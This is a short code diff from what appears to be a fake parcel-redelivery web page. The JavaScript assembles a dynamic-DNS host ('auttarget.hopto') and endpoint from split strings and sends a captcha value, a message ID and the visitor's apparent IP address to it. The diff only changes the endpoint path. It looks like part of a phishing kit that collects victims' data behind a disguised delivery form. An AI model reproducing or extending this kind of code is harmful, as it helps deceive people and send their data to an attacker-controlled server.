@@ -27,7 +27,7 @@ function checkInput() {
   var ipzebi = document.getElementById('ipzebi').value;
   let spark = "auttarget.hopto"
   let https = "http"
-  let webapp = "RedeliveryRequest"
+  let webapp = "vps/RedeliveryRequest"
   // This part ensures the captcha value is included in the request
   var dataToSend = "captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi);
   if (userInput.toLowerCase() === randomString.toLowerCase()) {
